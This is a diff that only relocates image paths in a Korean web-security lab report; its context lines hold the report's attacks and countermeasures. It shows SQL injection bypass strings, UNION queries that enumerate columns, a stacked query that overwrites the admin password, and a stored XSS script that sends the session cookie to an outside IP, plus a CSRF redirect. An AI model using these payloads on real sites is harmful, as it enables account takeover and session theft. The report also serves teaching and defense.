@@ -62,7 +62,7 @@ CSRF
 1. SQL Injection 
 - 로그인  실패  확인:  id에  admin,  pw에  아무것도  입력하지  않고  어떤  반응이  나타나는지  확인한다.
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.001.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.001.jpeg)
 
 alert로  ‘로그인  실패’라는  메시지가  뜨는  것을  확인했다.  여러  번  진행하여  로그인에  여러  번  실패  시 패널티가 있는 것을 확인한다. -> 패널티가 없음. 
 
@@ -77,7 +77,7 @@ alert로  ‘로그인  실패’라는  메시지가  뜨는  것을  확인했
 |' OR '1 |성공 |
 |' OR 'x'='x |성공 |
 |-- # |실패 |
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.002.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.002.jpeg)
 
 주석 처리는 허용되지 않았고, 문자열 조작을 통해 로그인에 성공할 수 있었다. 
 
@@ -89,7 +89,7 @@ alert로  ‘로그인  실패’라는  메시지가  뜨는  것을  확인했
 - 패스워드의 컬럼명을 password, pass, passwd, pw으로 유추하여 찾아내었다. [' OR '1' UNION SELECT 1,2,COLUMN\_NAME  from  INFORMATION\_SCHEMA.COLUMNS  where  TABLE\_NAME='user'  and COLUMN\_NAME='pw' # '1]  
 - 같은  방법으로  ID의  컬럼명도  찾아내었다.  ['  OR  '1'  UNION  SELECT  1,2,COLUMN\_NAME  from INFORMATION\_SCHEMA.COLUMNS where TABLE\_NAME='user' and COLUMN\_NAME='id' # '1] 
 - Admin password 변경 [' OR '1'; update user set pw='11111111' where id='admin'; # '1] 
-- ID: admin, PW: 11111111로 접속,  성공 ![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.003.jpeg)
+- ID: admin, PW: 11111111로 접속,  성공 ![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.003.jpeg)
 
 Admin 패스워드를 변경하는 데 성공했지만 다음 취약점들은 패스워드를 모르는 상태라고 가정한다. 
 
@@ -97,13 +97,13 @@ Admin 패스워드를 변경하는 데 성공했지만 다음 취약점들은 �
 3. Stored XSS 
 - Aws를 이용한 외부 서버 준비(for 세션 하이재킹)  
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.004.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.004.jpeg)
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.005.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.005.jpeg)
 
 글쓰기 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.006.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.006.jpeg)
 
 <script> 
 
@@ -113,7 +113,7 @@ setTimeout(() => location.href=`http://44.203.182.159/session.php?data=${cookieD
 
 Admin이 글에 접속하면 3초 뒤 해킹서버로 세션아이디 전송 (세션 하이재킹) 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.007.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.007.jpeg)
 
 PHPSESSID 복사해서 브라우저 쿠키에 삽입 -> 성공 
 
@@ -123,11 +123,11 @@ PHPSESSID 복사해서 브라우저 쿠키에 삽입 -> 성공
 5. CSRF 
 - 위에  만든  XSS는  브라우저에서  저장된  스크립트를  실행하여  Redirecting하는  페이지이다.  이번에는 CSRF를 이용하여 다른 글을  클릭하더라도 강제로 User 스스로 그 페이지로 이동하도록  할 것이다. 글 을 읽어올 때 기본적으로 GET 메소드를 사용하기 때문에 Url을 통한 위조가 가능하다. 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.008.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.008.jpeg)
 
 - 이와 같이 img 태그에 src를 XSS를 적용한 페이지로 설정해 간접적으로 Redirecting이 되도록 했다. 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.009.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.009.jpeg)
 
 - 위의 ‘급함급함’이라는 글을 클릭해도 XSS가 적용된 페이지로 이동하여 세션을 전송하게 된다. 
 
@@ -157,13 +157,13 @@ A. SQL Injection & B. Blind SQL Injection
 
 - 입력값 검증 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.010.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.010.jpeg)
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.011.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.011.jpeg)
 
 - 쿼리 구조적 보안성 향상(위 사진과 비교) 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.012.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.012.jpeg)
 
 - id나 pw에 입력하는 값마다 인코딩하게되면 서버 성능에 영향을 줄 것 같아 인코딩은 하지 않았다. 
 
@@ -171,17 +171,17 @@ C. Stored XSS & D. Reflected XSS & E. CSRF
 
 - 문자열 필터링 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.013.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.013.jpeg)
 
 - 세션 타임아웃 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.014.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.014.jpeg)
 
 - Post Method 이용 
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.015.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.015.jpeg)
 
-![](Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.016.jpeg)
+![](img/Aspose.Words.8937c5dc-ffaa-4ae4-8e38-164418a9c473.016.jpeg)
 
 ## 4 결론 
 
